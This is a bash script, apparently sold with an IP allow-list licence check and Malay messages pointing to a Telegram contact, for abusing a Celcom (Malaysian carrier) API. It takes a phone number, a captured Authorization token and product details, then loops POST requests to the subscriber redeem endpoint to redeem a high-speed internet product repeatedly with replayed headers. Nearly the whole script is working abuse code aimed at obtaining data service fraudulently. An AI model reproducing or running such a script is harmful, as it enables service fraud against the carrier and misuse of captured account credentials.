#!/bin/bash

clear
if [ "${EUID}" -ne 0 ]; then
echo "You need to run this script as root"
exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
echo "OpenVZ is not supported"
exit 1
fi
red='\e[1;31m'
green='\e[0;32m'
NC='\e[0m'
MYIP=$(wget -qO- ipinfo.io/ip);
IZIN=$( curl https://raw.githubusercontent.com/GCghosting/goslow/main/spam | grep $MYIP )
if [ $MYIP = $IZIN ]; then
clear
echo -e "${green}Tahniah! Anda Dibenarkan menggunakan Script Ini...${NC}"
else
clear
echo ""
echo '                            ...                               '
echo '        Anda Tidak Dibenarkan Menggunakan Script ini!         '
echo '                            ...                               '
echo '    Hubungi Saya di Telegram Untuk Mendapatkan Kebenaran!     '
echo '                        t.me/gassturn    '
sleep 20
exit 0
fi
clear 

echo "Input your Information"
sleep 1
clear 

num=1
read -p "Msisdn: " nombor
read -p "Authorization: " tac
read -p "RandomPi: " idd
read -p "ExpiredDate: " exp
read -p "limit: " limit
while [ $num -le $limit ]
do

curl --request POST \
  --url 'https://apicl3.celcom.com.my/subscriber-usage-info/redeem?lang=en' \
  --header 'Accept: application/json' \
  --header 'msisdn: '$nombor \
  --header 'Content-Type: application/json' \
  --header 'Host: apicl3.celcom.com.my' \
  --header 'Authorization: '$tac \
  --header 'x-dynatrace: MT_3_14_1938539898_77-0_e9ba6289-2990-4491-bb2c-bc8c2d6c256b_0_8362_1181' \
  --header 'accountType: Prepaid'\
  --data '{
  "msisdn": "'$nombor'",
  "requestFrom": "High_Speed_Internet",
  "productId": "2060343",
  "additionalInfo": {
    "mi_expiry_date": "'$exp'",
    "miProductId": "'$idd'"
  },
  "accountType": "Prepaid"
}' 

sleep 6
   ((num++))
done
sleep 1
clear
celcom